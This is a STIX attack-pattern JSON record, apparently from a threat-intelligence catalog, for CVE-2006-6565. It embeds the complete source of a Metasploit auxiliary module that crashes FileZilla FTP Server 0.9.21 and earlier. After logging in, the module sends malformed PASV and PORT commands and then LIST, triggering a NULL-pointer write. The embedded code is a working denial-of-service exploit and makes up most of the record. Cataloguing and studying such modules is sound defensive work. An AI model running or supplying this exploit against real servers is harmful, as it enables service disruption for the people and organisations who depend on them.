{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed324dd6-9b69-49e1-a6d3-4e1739982740",
    "created": "2024-08-14T16:25:24.362186Z",
    "modified": "2024-08-14T16:25:24.36219Z",
    "name": "FileZilla FTP Server Malformed PORT Denial of Service",
    "description": " This module triggers a Denial of Service condition in the FileZilla FTP Server versions 0.9.21 and earlier. By sending a malformed PORT command then LIST command, the server attempts to write to a NULL pointer. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/ftp/filezilla_server_port.rb",
            "external_id": "filezilla_server_port.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-6565"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'FileZilla FTP Server Malformed PORT Denial of Service',\n      'Description'\t=> %q{\n        This module triggers a Denial of Service condition in the FileZilla FTP\n        Server versions 0.9.21 and earlier. By sending a malformed PORT command\n        then LIST command, the server attempts to write to a NULL pointer.\n      },\n      'Author' \t\t=> [ 'aushack' ],\n      'License'        \t=> MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'BID', '21542' ],\n          [ 'BID', '21549' ],\n          [ 'CVE', '2006-6565' ],\n          [ 'EDB', '2914' ],\n          [ 'OSVDB', '34435' ]\n        ],\n      'DisclosureDate' => '2006-12-11'))\n  end\n\n  def run\n    begin\n      c = connect_login\n    rescue Rex::ConnectionRefused\n      print_error(\"Connection refused.\")\n      return\n    rescue Rex::ConnectionTimeout\n      print_error(\"Connection timed out\")\n      return\n    end\n\n    return if not c\n\n    send_cmd(['PASV', 'A*'], true) # Assigns PASV port\n    send_cmd(['PORT', 'A*'], true) # Rejected but seems to assign NULL to pointer\n    send_cmd(['LIST'], true) # Try and push data to NULL port, trigger crash :)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-12-11"
}